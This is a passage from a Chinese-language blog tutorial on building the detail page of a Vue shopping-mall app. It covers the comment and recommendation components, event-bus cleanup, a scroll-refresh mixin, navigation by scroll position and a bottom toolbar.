:key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;formatDate&#125; from &#39;common&#x2F;utils&#39;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;DetailCommentInfo&#39;,</span><br><span class="line">  props:&#123;</span><br><span class="line">      commentInfo:&#123;</span><br><span class="line">          type: Object,</span><br><span class="line">          default()&#123;</span><br><span class="line">              return &#123;&#125;;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123; </span><br><span class="line">    return &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">    filters: &#123;</span><br><span class="line">  showDate: function (value) &#123;</span><br><span class="line">        let date &#x3D; new Date(value*1000);</span><br><span class="line">        return formatDate(date, &#39;yyyy-MM-dd&#39;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .comment-info &#123;</span><br><span class="line">    padding: 5px 12px;</span><br><span class="line">    color: #333;</span><br><span class="line">    border-bottom: 5px solid #f2f5f8;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-header &#123;</span><br><span class="line">    height: 50px;</span><br><span class="line">    line-height: 50px;</span><br><span class="line">    border-bottom: 1px solid rgba(0,0,0,.1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .header-title &#123;</span><br><span class="line">    float: left;</span><br><span class="line">    font-size: 15px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .header-more &#123;</span><br><span class="line">    float: right;</span><br><span class="line">    margin-right: 10px;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-user &#123;</span><br><span class="line">    padding: 10px 0 5px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-user img &#123;</span><br><span class="line">    width: 42px;</span><br><span class="line">    height: 42px;</span><br><span class="line">    border-radius: 50%;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-user span &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    font-size: 15px;</span><br><span class="line">    top: -15px;</span><br><span class="line">    margin-left: 10px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-detail &#123;</span><br><span class="line">    padding: 0 5px 15px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-detail p &#123;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    color: #777;</span><br><span class="line">    line-height: 1.5;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-detail .info-other &#123;</span><br><span class="line">    font-size: 12px;</span><br><span class="line">    color: #999;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-other .date &#123;</span><br><span class="line">    margin-right: 8px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-imgs &#123;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-imgs img &#123;</span><br><span class="line">    width: 70px;</span><br><span class="line">    height: 70px;</span><br><span class="line">    margin-right: 5px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></li><li><p>导入组件并使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;detail-comment-info :commentInfo&#x3D;&quot;commentInfo&quot;&gt;&lt;&#x2F;detail-comment-info&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="相关商品推荐数据"><a href="#相关商品推荐数据" class="headerlink" title="相关商品推荐数据"></a>相关商品推荐数据</h2><p>这里请求的数据是另外一个接口，所以我们封装一个推荐商品的网络请i去，在network的detail.js中，书写如下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">getRecommend</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    url: <span class="string">'/api/h8/recommend'</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到detail组件，导入该函数，并在created请求以及保存数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取商品推荐数据</span></span><br><span class="line">getRecommend().then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.recommends = res.data.list</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里我们用到GoodsList组件用于展示推荐的商品数据</p><p>在导入前我们需要对GoodListItem进行相应的小修改，因为数据来源的不同，所以得到各自的商品数据也会不同，首页的商品数据是通过goodsItem.image属性得到<br>而详情页的推荐数据是通过goodsItem.show.img得到，所以这里我们定义一个computed计算属性，对数据进行判断，存在哪个数据就对哪个数据进行渲染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  showImage() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.goodsItem.image || <span class="keyword">this</span>.goodsItem.show.img</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>标签进行相应的修改，动态获取链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img :src&#x3D;&quot;showImage&quot; alt&#x3D;&quot;&quot; @load&#x3D;&quot;imgLoad&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后就可以在Detail组件中进行引用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;goods-list :goods&#x3D;&quot;recommends&quot;&gt;&lt;&#x2F;goods-list&gt;</span><br></pre></td></tr></table></figure><p>OK。推荐信息的展示到此就完成啦</p><h2 id="根据判断推荐信息是否需要刷新"><a href="#根据判断推荐信息是否需要刷新" class="headerlink" title="根据判断推荐信息是否需要刷新"></a>根据判断推荐信息是否需要刷新</h2><p>在前面，推荐页引用了GoodsList组件，但是会有一个问题，我们之前在使用首页引用该组件时，因为scroll刷新的问题，我们让其图片加载完后发送一个事件出去，这就导致我们在详情页面调用该组件时也会使其向主页发送图片加载的事件，从而浪费性能，所以我们需要解决该问题，同时，因为详情页也需要刷新，所以我们需要采取合适的方法同时解决这两个问题，解决方案有两个</p><ol><li><p>路由判断解决</p><p>根据<code>this.$route.path.indexOf(&#39;路径&#39;)</code>判断引用该组件的当前页面是哪个，从而进行对应的事件发送</p><p>在GoodsListItem中，我们修改imgLoad方法，根据.$route.path.indexOf()方法得到当前页面为哪个，从而发送相应事件，同时，你需要将相关页面的方法<code>itemImageLoad</code>改为<code>homeItemImageLoad/detailItemImageLoad</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">imgLoad() &#123;</span><br><span class="line">  <span class="comment">//解决判断推荐页或首页数据是否需要刷新①</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.$route.path.indexOf(<span class="string">'/home'</span>) !== <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.$bus.$emit(<span class="string">'homeItemImageLoad'</span>) </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.$route.path.indexOf(<span class="string">'/detail'</span> !== <span class="number">-1</span>))&#123;</span><br><span class="line">    <span class="keyword">this</span>.$bus.$emit(<span class="string">'detailItemImageLoad'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>deactivated+destroyed</p><p>这个方法可以不修改imgLoad的内容，转而添加Home和Detail的相关代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imgLoad() &#123;</span><br><span class="line"><span class="keyword">this</span>.$bus.$emit(<span class="string">'itemImageLoad'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以在引用该组件的相关父组件的生命周期函数中，当该组件处于非活跃状态（即跳转其他组件）时，关闭改事件（this.$bus.$off(“事件名”)）</p><p>在Home.vue中，因为keep-alive的存在，所以即使跳转到其它路由，该组件也只是（deactivated）而不是销毁（destroyed），所以我们在deactivated函数中，取消该事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deactivated() &#123;</span><br><span class="line">  <span class="comment">//取消监听</span></span><br><span class="line">  <span class="keyword">this</span>.$bus.$off(<span class="string">'itemImgLoad'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Detail.vue中，因为每次跳转其它路由，该组件会直接销毁，所以我们在其销毁（destroyed）时关闭该事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">destroyed() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$bus.$off(<span class="string">'itemImageLoad'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="mixin"><a href="#mixin" class="headerlink" title="mixin"></a>mixin</h2><p>我们需要同Home一样对Detail的相关图片加载事件也做scroll刷新处理，这些步骤和Home是完全一致的，所以，是否有一个办法能将这些共有的生命周期函数或者data数据进行统一管理，再在各个需要的组件去复用呢，答案就是——mixin</p><p>这里主要用到的是vue的混入（mixin）——<a href="https://cn.vuejs.org/v2/guide/mixins.html" target="_blank" rel="noopener">官网介绍</a></p><blockquote><p>混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。</p></blockquote><p>这是Detail.vue和Home.vue中共有的生命周期函数，也就是监听图片的加载事件并作出防抖刷新操作，在这里，我们用data去接收防抖函数的返回值<code>this.newRefresh</code>以及监听图片加载做出的反应函数<code>this.itemImgListener</code>，然后再在该组件活跃时启动该函数<code>this.$bus.$on(&#39;监听事件&#39;, 该监听事件要启动的函数)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">  <span class="keyword">this</span>.newRefresh = debounce(<span class="keyword">this</span>.$refs.scroll.refresh, <span class="number">100</span>) <span class="comment">//注意不要加括号，否则传入的是函数返回值</span></span><br><span class="line">  <span class="keyword">this</span>.itemImgListener = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.newRefresh()</span><br><span class="line">    <span class="comment">// this.$refs.scroll.refresh()</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.$bus.$on(<span class="string">'itemImageLoad'</span>, <span class="keyword">this</span>.itemImgListener)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们在common文件夹中新建一个mixin.js文件，将该生命周期函数导出，记得将防抖函数一并导入，同时你会发现，他们也有共同的data需要进行管理，所以我们在mixin.js中也一并将与scroll的refresh有关的data添加进去</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; debounce &#125; <span class="keyword">from</span> <span class="string">"common/utils"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> itemListenerMixin = &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      itemImgListener: <span class="literal">null</span>,</span><br><span class="line">      newRefresh: <span class="literal">null</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    <span class="keyword">this</span>.newRefresh = debounce(<span class="keyword">this</span>.$refs.scroll.refresh, <span class="number">100</span>) <span class="comment">//注意不要加括号，否则传入的是函数返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.itemImgListener = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.newRefresh()</span><br><span class="line">      <span class="comment">// this.$refs.scroll.refresh()</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">this</span>.$bus.$on(<span class="string">'itemImageLoad'</span>, <span class="keyword">this</span>.itemImgListener)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在Detail和Home组件中分别导入该模块以及函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mixin操作</span></span><br><span class="line"><span class="keyword">import</span> &#123;itemListenerMixin&#125; <span class="keyword">from</span> <span class="string">'common/mixin.js'</span></span><br></pre></td></tr></table></figure><p>使用方式非常简单，将需要用到的mixin函数定义在mixins数组中即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixins: [itemListenerMixin],</span><br></pre></td></tr></table></figure><p>OK,这就是mixin的使用方式</p><p>最后，因为一个监听事件可能会有多个执行函数，所以$off同$on一样提供了第二个参数供我们添加将要关闭的具体函数,回到destroyed和deactivated函数中，修改相关代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//取消监听</span></span><br><span class="line"><span class="keyword">this</span>.$bus.$off(<span class="string">'itemImgLoad'</span>, <span class="keyword">this</span>.itemImgListener)</span><br></pre></td></tr></table></figure><h2 id="点击标题跳转至指定内容"><a href="#点击标题跳转至指定内容" class="headerlink" title="点击标题跳转至指定内容"></a>点击标题跳转至指定内容</h2><p>首先我们需要理清该业务的实现思路</p><blockquote><ol><li>DetailNavBar组件发送每个item的点击事件以及索引值</li><li>父组件监听点击事件</li><li>定义一个数组存储每个子组件的起始Y值</li><li>监听每个子组件的起始Y值，将值添加至数组中🔺</li><li>在父组件的监听点击事件中，根据索引值跳转至指定位置</li></ol></blockquote><p>ok，前三步问题不大，重点在第四步，我们要在哪里监听每个组件的起始Y值，首先，我们先将需要监听的代码放出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.themeTopYs.push(<span class="number">0</span>)</span><br><span class="line">       <span class="keyword">this</span>.themeTopYs.push(<span class="keyword">this</span>.$refs.params.$el.offsetTop - <span class="number">44</span>)</span><br><span class="line">       <span class="keyword">this</span>.themeTopYs.push(<span class="keyword">this</span>.$refs.comment.$el.offsetTop - <span class="number">44</span>)</span><br><span class="line">       <span class="keyword">this</span>.themeTopYs.push(<span class="keyword">this</span>.$refs.recommend.$el.offsetTop - <span class="number">44</span>)</span><br></pre></td></tr></table></figure><ol><li><p>mounted()❌</p><p>当我们在该函数中监听具体的值并存入数组时，发现不可行，原因就是，这时候的子组件还未完全创建好，高度并没有真正定下来</p></li><li><p>updated()❌</p><p>可以实现，但是该生命周期函数是在每次页面刷新时就会在执行一次，也就是说，你加载一张图片它就刷新一次，最终导致push一堆值进去，当然这个问题很好解决，在每次执行前加上一句<code>this.themeTopYs = []</code> ,但是还是有问题，他执行太过频繁，浪费太多性能</p></li><li><p>create中的this.$nextTick(回调函数)函数❌</p><p>不可行，虽然他在组件创建完才执行，但是他只渲染出来DOM，这个时候异步请求过来的图片数据还未渲染完成，高度依然不准确</p></li><li><p>图片加载函数（imgLoad()）✔</p><p>我们首先在created()中去定义防抖后的高度获取函数，即组件创建后执行函数创建，同时定义一个data<code>getThemeTopYs</code>接收该函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">created() &#123;</span><br><span class="line">  <span class="keyword">this</span>.getThemeTopYs = debounce(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.themeTopYs = []</span><br><span class="line">      <span class="keyword">this</span>.themeTopYs.push(<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">this</span>.themeTopYs.push(<span class="keyword">this</span>.$refs.params.$el.offsetTop - <span class="number">44</span>)</span><br><span class="line">      <span class="keyword">this</span>.themeTopYs.push(<span class="keyword">this</span>.$refs.comment.$el.offsetTop - <span class="number">44</span>)</span><br><span class="line">      <span class="keyword">this</span>.themeTopYs.push(<span class="keyword">this</span>.$refs.recommend.$el.offsetTop - <span class="number">44</span>)</span><br><span class="line">      <span class="keyword">this</span>.themeTopYs.push(<span class="built_in">Number</span>.MAX_VALUE)</span><br><span class="line">    &#125;, <span class="number">100</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再在每次执行图片刷新时执行一次该函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">imageLoad() &#123;</span><br><span class="line">    <span class="keyword">this</span>.$refs.scroll.refresh()</span><br><span class="line">    <span class="keyword">this</span>.getThemeTopYs()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，每次在防抖执行时间内图片加载完就会执行刷新</p></li></ol><h2 id="滚动内容显示对应标题"><a href="#滚动内容显示对应标题" class="headerlink" title="滚动内容显示对应标题"></a>滚动内容显示对应标题</h2><p>通过监听scroll的滚动事件，动态改变所选标题的样式，同样理清思路</p><ol><li>父组件接收Scroll滚动事件（<code>@scroll=&quot;contentScroll&quot;</code>）</li><li>判断当前滚动位置处于之前定义数组哪个区间内，是则返回该区间对应标题索引🔺</li><li>DetailNavBar绑定ref同时将currentIndex修改为当前选项索引并传递过去（<code>this.$refs.nav.currentIndex</code>）实现样式改变</li></ol><p>重点在于第二个的判断</p><ul><li><p>for循环进行遍历<code>for(let i = 0; i &lt; this.themeTopYs.length; i++)</code></p></li><li><p>内部进行判断，有点长</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">this</span>.currentIndex !== i &amp;&amp; ((i &lt; length - <span class="number">1</span> &amp;&amp; positionY &gt;= <span class="keyword">this</span>.themeTopYs[i] &amp;&amp; positionY &lt; <span class="keyword">this</span>.themeTopYs[i + <span class="number">1</span>]) || (i === length - <span class="number">1</span> &amp;&amp; positionY &gt;=  <span class="keyword">this</span>.themeTopYs[i])))</span><br></pre></td></tr></table></figure><p>简短的总结一下</p><ul><li><p>当前的currentIndex是否为遍历的值（注意这是detaili组件定义的data属性，默认为0），作用是避免重复执行if语句内的代码</p></li><li><p>当前的i是否小于该数组最大索引</p><ul><li>当前滚动位置是否大于 this.themeTopYs[i]</li><li>是否小于 this.themeTopYs[i+1]</li></ul></li><li><p>当前的i是否等于该数组最大索引</p><ul><li>当前滚动位置是否大于 this.themeTopYs[i]</li></ul><p>上流程图理解下</p></li></ul><p>![未命名文件 (6.详情页下/未命名文件 (1).png)](C:/Users/12524/OneDrive/note/vue/vue-mall/未命名文件 (1).png)</p></li><li><p>满足条件，执行下列代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.currentIndex = i</span><br><span class="line"><span class="keyword">this</span>.$refs.nav.currentIndex = <span class="keyword">this</span>.currentIndex</span><br></pre></td></tr></table></figure></li></ul><p>上述逻辑看似完美无缺（当然有点逻辑复杂），但是执行起来效率可能会有点慢，接下来就是考虑如何缩短代码量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.currentIndex !== i &amp;&amp; (positionY &gt; <span class="keyword">this</span>.themeTopYs[i] &amp;&amp; positionY &lt; <span class="keyword">this</span>.themeTopYs[i+<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">this</span>.currentIndex = i</span><br><span class="line">    <span class="keyword">this</span>.$refs.nav.currentIndex = <span class="keyword">this</span>.currentIndex</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边利用<code>Number.MAX_VALUE</code>获取js的理论最大值，在前面获取各个组件位置后面加上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.themeTopYs.push(<span class="built_in">Number</span>.MAX_VALUE)</span><br></pre></td></tr></table></figure><p>从而摆脱判断当前索引值是否为最大的问题，同时将 for语句内的<code>i &lt; length</code> 改为<code>i &lt; length - 1</code>，因为我们实际上也不需要最后一个索引值，这样，就可以判断当前高度符合哪个区间范围，实现索引赋值，减少代码量，以空间换时间（操作系统）</p><h2 id="底部工具栏封装"><a href="#底部工具栏封装" class="headerlink" title="底部工具栏封装"></a>底部工具栏封装</h2><p>步骤</p><ol><li>创建组件</li><li>引用组件</li><li>样式修改（根据该底部栏的高度，讲父组件Detail的scroll样式高度改为 <code>height: calc(100% - 44px - 58px);</code></li></ol><p>没啥可说的，直接丢代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;bottom-bar&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;bar-item bar-left&quot;&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;icon service&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;text&quot;&gt;客服&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;icon shop&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;text&quot;&gt;店铺&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;icon select&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;text&quot;&gt;收藏&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;bar-item bar-right&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;cart&quot; @click&#x3D;&quot;addToCart&quot;&gt;加入购物车&lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;buy&quot;&gt;购买&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;DetailBottomBar&quot;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      addToCart() &#123;</span><br><span class="line">        this.$emit(&#39;addToCart&#39;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .bottom-bar &#123;</span><br><span class="line">    height: 58px;</span><br><span class="line">    position: relative;</span><br><span class="line">    background-color: #fff;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">    bottom: 0;</span><br><span class="line"></span><br><span class="line">    display: flex;</span><br><span class="line">    text-align: center;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-item &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">    display: flex;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-item&gt;div &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-left .text &#123;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-left .icon &#123;</span><br><span class="line">    display: block;</span><br><span class="line">    width: 22px;</span><br><span class="line">    height: 22px;</span><br><span class="line">    margin: 10px auto 3px;</span><br><span class="line">    background: url(&quot;~assets&#x2F;img&#x2F;detail&#x2F;detail_bottom.png&quot;) 0 0&#x2F;100%;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-left .service &#123;</span><br><span class="line">    background-position:0 -54px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-left .shop &#123;</span><br><span class="line">    background-position:0 -98px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-right &#123;</span><br><span class="line">    font-size: 15px;</span><br><span class="line">    color: #fff;</span><br><span class="line">    line-height: 58px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-right .cart &#123;</span><br><span class="line">    background-color: #ffe817;</span><br><span class="line">    color: #333;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bar-right .buy &#123;</span><br><span class="line">    background-color: 